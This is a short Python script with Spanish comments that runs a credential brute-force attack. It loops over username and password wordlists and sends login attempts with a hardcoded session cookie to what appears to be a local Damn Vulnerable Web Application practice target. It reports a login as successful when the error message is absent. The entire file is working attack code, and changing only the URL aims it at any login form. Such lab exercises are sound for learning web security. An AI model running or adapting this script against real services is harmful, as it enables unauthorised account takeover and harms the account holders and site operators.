import requests

# Configurar URL del formulario de login
url = 'http://127.0.0.1:4280/vulnerabilities/brute/'

# Leer los usuarios desde el archivo names.txt
with open('names.txt', 'r') as file:
    usuarios = [line.strip() for line in file.readlines()]

# Leer las contraseñas desde el archivo passwords.txt
with open('passwords.txt', 'r') as file:
    contrasenas = [line.strip() for line in file.readlines()]

# Crear sesión de requests
session = requests.Session()

# Definir cookies y cabeceras
cookies = {
    'PHPSESSID': '5083f7f480bae7d8a5a258ac4fcce5e8',
    'security': 'medium'
}
cabeceras = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Connection': 'keep-alive',
    'Referer': 'http://localhost:4280/vulnerabilities/brute/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1'
}

# Función para verificar el login
def intentar_login(usuario, contrasena):
    params = {
        'username': usuario,
        'password': contrasena,
        'Login': 'Login'
    }
    
    # Enviar solicitud GET con cookies y cabeceras
    respuesta = session.get(url, headers=cabeceras, cookies=cookies, params=params)
    
    # Verificar si la respuesta contiene el mensaje de error
    if "Username and/or password incorrect." in respuesta.text:
        print(f"Intento fallido para: {usuario}, {contrasena}")
    else:
        print(f"Login exitoso! Usuario: {usuario}, Contraseña: {contrasena}")

# Realizar ataque de fuerza bruta
for usuario in usuarios:
    for contrasena in contrasenas:
        print(f"Intentando: Usuario={usuario} | Contraseña={contrasena}")
        intentar_login(usuario, contrasena)
